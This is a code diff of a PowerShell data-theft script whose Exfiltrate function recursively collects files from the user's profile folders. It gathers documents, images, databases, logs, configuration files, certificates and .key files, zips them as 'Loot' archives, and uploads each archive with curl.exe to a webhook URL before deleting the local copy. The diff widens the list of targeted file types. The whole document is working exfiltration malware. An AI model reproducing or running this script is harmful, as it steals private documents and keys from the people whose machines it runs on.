@@ -1,19 +1,23 @@
 $hookurl = "$dc"
+
 # shortened URL Detection
-if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Ln -ne 121) {
+    Write-Host "Shortened Webhook URL Detected.." 
+    $hookurl = (irm $hookurl).url
+}
 
 Function Exfiltrate {
     param (
         [string[]]$FileType,
         [string[]]$Path
     )
-
+    
     $maxZipFileSize = 25MB
     $currentZipSize = 0
     $index = 1
 
-    If ($Path -ne $null) {
-        $foldersToSearch = "$env:USERPROFILE\" + $Path
+    If($Path -ne $null){
+        $foldersToSearch = "$env:USERPROFILE\"+$Path
     } else {
         $foldersToSearch = @(
             "$env:USERPROFILE\Documents",
@@ -25,15 +29,40 @@ Function Exfiltrate {
         )
     }
 
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    If($FileType -ne $null){
+        $fileExtensions = "*."+$FileType
+    } else {
+        $fileExtensions = @(
+            "*.log", 
+            "*.db", 
+            "*.txt", 
+            "*.doc", 
+            "*.pdf", 
+            "*.jpg", 
+            "*.jpeg", 
+            "*.png", 
+            "*.wdoc", 
+            "*.xdoc", 
+            "*.cer", 
+            "*.key", 
+            "*.xls", 
+            "*.xlsx", 
+            "*.cfg", 
+            "*.conf", 
+            "*.wpd", 
+            "*.rft"
+        )
+    }
 
     foreach ($folder in $foldersToSearch) {
-        $folderName = (Split-Path -Path $folder -Leaf)
-        $zipFilePath = "$env:temp\$folderName.zip"
+        $folderName = (Split-Path $folder -Leaf)
+        $zipFilePath = Join-Path $env:temp "Loot$index-$folderName.zip"
+
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
         $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
 
-        foreach ($extension in $FileType) {
-            $files = Get-ChildItem -Path $folder -Filter "*.$extension" -File -Recurse
+        foreach ($extension in $fileExtensions) {
+            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
             foreach ($file in $files) {
                 $fileSize = $file.Length
                 if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
@@ -43,7 +72,7 @@ Function Exfiltrate {
                     Remove-Item -Path $zipFilePath -Force
                     Sleep 1
                     $index++
-                    $zipFilePath = "$env:temp\$folderName$index.zip"
+                    $zipFilePath = Join-Path $env:temp "Loot$index-$folderName.zip"
                     $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                 }
                 $entryName = $file.FullName.Substring($folder.Length + 1)
@@ -51,12 +80,12 @@ Function Exfiltrate {
                 $currentZipSize += $fileSize
             }
         }
-
         $zipArchive.Dispose()
         curl.exe -F file1=@"$zipFilePath" $hookurl
         Remove-Item -Path $zipFilePath -Force
-        Write-Output "$env:COMPUTERNAME : Exfiltration de $folderName terminée."
     }
+
+    Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
 }
 
 Exfiltrate
